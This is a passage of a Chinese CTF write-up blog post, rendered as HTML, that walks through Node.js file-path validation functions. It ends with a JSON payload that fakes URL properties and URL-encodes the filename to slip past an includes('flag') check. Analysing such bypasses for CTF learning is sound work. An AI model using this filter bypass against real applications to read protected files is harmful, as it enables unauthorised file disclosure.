class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>getValidatedPath</strong> 中用
+<strong>toPathIfFileURL</strong> 获取路径。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getValidatedPath = <span class="title function_">hideStackFrames</span>(<span class="function">(<span class="params">fileURLOrPath, propName = <span class="string">&#x27;path&#x27;</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> path = <span class="title function_">toPathIfFileURL</span>(fileURLOrPath);</span><br><span class="line">  <span class="title function_">validatePath</span>(path, propName);</span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>toPathIfFileURL</strong> 中使用
+<strong>isURLInstance</strong> 判断路径是 <strong>URL</strong> 还是
+<strong>Path</strong>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">toPathIfFileURL</span>(<span class="params">fileURLOrPath</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(fileURLOrPath))</span><br><span class="line">    <span class="keyword">return</span> fileURLOrPath;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fileURLToPath</span>(fileURLOrPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>isURLInstance</strong> 中，当路径存在 <strong>href</strong>
+和 <strong>origin</strong> 属性时被判定为 <strong>URL</strong>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isURLInstance</span>(<span class="params">fileURLOrPath</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> fileURLOrPath != <span class="literal">null</span> &amp;&amp; fileURLOrPath.<span class="property">href</span> &amp;&amp; fileURLOrPath.<span class="property">origin</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后调用 <strong>fileURLToPath</strong> 方法转换 <strong>URL</strong>
+为 <strong>Path</strong>，其中 <strong>protocol</strong> 属性需要为
+<strong>file:</strong>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fileURLToPath</span>(<span class="params">path</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> path === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">    path = <span class="keyword">new</span> <span class="title function_">URL</span>(path);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(path))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_ARG_TYPE</span>(<span class="string">&#x27;path&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;URL&#x27;</span>], path);</span><br><span class="line">  <span class="keyword">if</span> (path.<span class="property">protocol</span> !== <span class="string">&#x27;file:&#x27;</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_URL_SCHEME</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> isWindows ? <span class="title function_">getPathFromURLWin32</span>(path) : <span class="title function_">getPathFromURLPosix</span>(path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于不是 <strong>Windows</strong>，因此进入
+<strong>getPathFromURLPosix</strong> 来获取
+<strong>path</strong>，在这个方法中，<strong>hostname</strong>
+需要为空字符，然后对 <strong>pathname</strong> 进行一次
+<strong>URL</strong> 解码并返回。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPathFromURLPosix</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">hostname</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_HOST</span>(platform);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> pathname = url.<span class="property">pathname</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> n = <span class="number">0</span>; n &lt; pathname.<span class="property">length</span>; n++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pathname[n] === <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> third = pathname.<span class="title function_">codePointAt</span>(n + <span class="number">2</span>) | <span class="number">0x20</span>;</span><br><span class="line">      <span class="keyword">if</span> (pathname[n + <span class="number">1</span>] === <span class="string">&#x27;2&#x27;</span> &amp;&amp; third === <span class="number">102</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_PATH</span>(</span><br><span class="line">          <span class="string">&#x27;must not include encoded / characters&#x27;</span></span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(pathname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="结论-1">结论</h2>
+<p>传入 <strong>href</strong> 和 <strong>origin</strong>
+不为空，<strong>protocol</strong> 为
+<strong>file:</strong>，<strong>hostname</strong> 为空字符，这时
+<strong>pathname</strong> 可以通过 <strong>URL</strong> 编码绕过
+<strong>includes("flag")</strong> 的判定。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;href&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span><span class="string">&quot;file:&quot;</span><span class="punctuation">,</span><span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pathname&quot;</span><span class="punctuation">:</span><span class="string">&quot;/fl%61g.txt&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="refer">REFER</h1>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11512"><strong>PHP</strong>
+变量流量层面 <strong>WAF</strong> 绕过</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/Crypto/" rel="tag"><i class="fa fa-tag"></i> Crypto</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Study-Unserialize-Shiro/" rel="prev" title="浅探 Shiro 反序列化">
+                  <i class="fa fa-chevron-left"></i> 浅探 Shiro 反序列化
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Study-Unserialize-FastJson/" rel="next" title="FastJson 反序列化初探">
+                  FastJson 反序列化初探 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
